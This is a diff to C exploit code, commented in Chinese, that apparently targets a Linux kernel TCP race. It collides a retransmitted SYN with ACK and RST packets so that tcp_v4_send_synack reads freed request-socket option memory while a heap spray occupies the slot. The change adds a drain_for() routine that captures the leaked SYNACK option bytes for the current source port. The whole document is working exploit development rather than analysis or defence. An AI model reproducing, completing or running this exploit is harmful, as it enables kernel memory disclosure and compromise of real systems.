@@ -313,6 +313,25 @@ __attribute__((unused)) static void complete_ack_only(uint16_t sport, uint32_t i
     tx(pkt, len);
 }
 
+/* 取走环形缓冲里属于 sport 的所有 SYNACK，交给调用方判定。
+ *
+ * 竞态那条读路径的 SYNACK 带的是**本轮的源端口**（重传 SYN 用的就是同一个
+ * sport），但下一轮 syn_round 会换一个随机端口，按端口过滤就会把它丢掉 ——
+ * 原来命中永远看不到，根因就在这里。 */
+static int drain_for(uint16_t sport, struct synack *out, int max) {
+    int n = 0;
+    for (;;) {
+        pthread_mutex_lock(&g_ring_lock);
+        struct synack s;
+        int got = pop(&s);
+        pthread_mutex_unlock(&g_ring_lock);
+        if (!got) break;
+        if (s.sport != sport) continue;
+        if (n < max) out[n++] = s;
+    }
+    return n;
+}
+
 /* 竞态的两半，必须落在不同 CPU 上：
  *
  *   读侧：重传 SYN → tcp_conn_request → tcp_v4_send_synack，在 RCU 临界区里
@@ -424,7 +443,11 @@ static int find_text_candidates(const struct synack *s, uint64_t *out, int max) 
 /* 竞态：一边持续喷淋占位，一边把 ACK 与重传 SYN 对撞。
  *
  * 顺序很重要 —— 必须在喷淋已经跑起来之后再放 ACK，否则释放出来的槽位
- * 还是空的，回读到的是残留堆（或者根本读不到）。 */
+ * 还是空的，回读到的是残留堆（或者根本读不到）。
+ *
+ * 另一件同样重要的事：重传路径的 SYNACK 带的是**本轮**的源端口，
+ * 而下一轮 syn_round 会换一个随机端口。所以命中必须在 fire_pair 之后
+ * 用 drain_for 当场收走，等下一轮再看就永远看不到。 */
 static int phase_race(struct hit_ctx *hit) {
     int found = 0;
     say("开始竞态：喷淋 %d 个对象/轮，最多 %d 轮", SPRAY_SOCKS, g_rounds);
@@ -448,10 +471,30 @@ static int phase_race(struct hit_ctx *hit) {
             spray_stop();
             break;
         }
-        /* 把同步 ACK 与重传 SYN 对撞：ACK 让 ireq_opt 交给子 socket，
-         * 重传 SYN 走 tcp_v4_send_synack 那条读路径。 */
+        /* 把 SYN / ACK / RST 对撞：ACK 让 ireq_opt 交给子 socket 并置空，
+         * RST 紧跟其后让子 socket 销毁触发 kfree；重传 SYN 走
+         * tcp_v4_send_synack 那条 RCU 读路径。 */
         fire_pair(sport, isn, s.seq);
         usleep(1500);
+
+        /* 重传那条路径的 SYNACK 带的是本轮 sport，必须在这里收，不能等下一轮。 */
+        struct synack late[8];
+        int late_n = drain_for(sport, late, 8);
+        for (int i = 0; i < late_n; i++) {
+            struct synack *ls = &late[i];
+            if (ls->optlen == 0) { g_clear++; continue; }
+            if (ls->optlen == OPT_MAXLEN) continue;
+            g_hit++;
+            say("命中（重传路径）r=%d optlen=%u gen=%u", r, ls->optlen, g_spray_gen);
+            dump_opts(ls);
+            hit->sport = sport;
+            hit->isn = isn;
+            hit->s = *ls;
+            found = 1;
+            spray_stop();
+            break;
+        }
+        if (found) break;
         if (g_verbose && (r % 100) == 0)
             say("r=%d synack=%lu hit=%lu clear=%lu none=%lu spray_gen=%u",
                 r, g_synack, g_hit, g_clear, g_none, g_spray_gen);
